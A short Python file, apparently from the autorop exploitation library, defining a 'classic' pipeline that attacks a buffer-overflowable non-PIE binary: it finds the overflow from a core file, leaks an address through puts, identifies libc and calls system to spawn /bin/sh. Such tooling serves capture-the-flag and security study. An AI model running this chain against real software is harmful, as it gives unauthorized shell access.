from autorop import PwnState, pipeline, bof, leak, libc, call


def classic(state: PwnState) -> PwnState:
    """Perform an attack against a non-PIE buffer-overflowable binary."""
    return pipeline(state, bof.corefile, leak.puts, libc.rip, call.system_binsh)
